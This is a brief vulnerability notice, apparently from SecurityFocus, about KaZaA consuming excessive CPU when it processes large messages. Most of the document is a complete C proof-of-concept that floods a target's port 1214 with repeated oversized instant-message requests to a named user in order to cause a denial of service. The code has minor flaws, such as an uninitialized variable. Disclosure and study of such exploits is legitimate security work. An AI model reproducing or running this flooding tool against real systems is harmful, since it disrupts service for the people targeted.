source: http://www.securityfocus.com/bid/5317/info

KaZaA may consume large amounts of CPU when processing a sequence of large messages. It is possible for an attacker to flood a vulnerable system with a large number of messages, resulting in a denial of service condition.

/*
   kazaa denial of service attack
   by Josh and omega
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdarg.h>

#define PORT 1214


int main(int argc, char *argv[])
{
   int fd, numbytes, randnum, k;
   struct hostent *host;
   struct sockaddr_in them;
   char buf2[4026];
   char buf[5000];
   char *bigboy;
   int i, size, j;


   memset(buf2, 'a', sizeof(buf2));
   buf2[sizeof(buf2)-1]='\0';
   srand(time(NULL));

   if (argc < 5)
   {
      fprintf(stderr,"usage: %s <hostname> <(this*4026) bytes per message> <username_of_target> <number_of_messages>\n", argv[0]);
      exit(1);
   }
   if ((host=gethostbyname(argv[1])) == NULL)
   {
      perror("gethostbyname");
      exit(1);
   }

   them.sin_family = AF_INET;
   them.sin_port = htons(PORT);
   them.sin_addr = *((struct in_addr *)host->h_addr);
   memset(&(them.sin_zero), '\0', 8);


   size=(4042*atoi(argv[2]))+280+1;
   bigboy=(char *)malloc(size);

   snprintf(bigboy, size, "GET /.message HTTP/1.1\nHost: 68.10.112.148:1214\nUserAgent: KazaaClient Jan 18 2002 18:53:21\nX-Kazaa-Username: 31337h4x0r\nX-Kazaa-Network: KaZaA\nX-Kazaa-IP: %d:1214\nX-Kazaa-SupernodeIP: %d:1214\nConnection:  open\nX-Kazaa-IMTo: %s@KaZaA\nX-Kazaa-IMType: user_text\n", randnum, randnum, argv[3]);

   /* the msg appears as one msg to the receiver, but comes in intervals of 4096 bytes... */
   snprintf(buf, sizeof(buf), "X-Kazaa-IMData: %s\n", buf2);
   for(k=0;k<atoi(argv[2]);k++)
   {
      strcat(bigboy, buf);
      k++;
   }
   strcat(bigboy, "\r\n\r\n\r\n\r\n\r\n");

   fprintf(stdout, "done preparing packet... sending\n");
   for(i=0, k=0;i<atoi(argv[4]);i++)
   {
     if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
       perror("socket");
     }
     else
     {
       if (connect(fd, (struct sockaddr *)&them,sizeof(struct sockaddr)) == -1)
       {
         perror("connect");
       }
       else
       {
         printf("sending %d message\n", k);
         write(fd, bigboy, strlen(bigboy));
         k++;
         close(fd);
       }
     }
   }
   fprintf(stdout, "\n%d out of %d attempted got through\n", k, i);
   free(bigboy);
   return 0;
}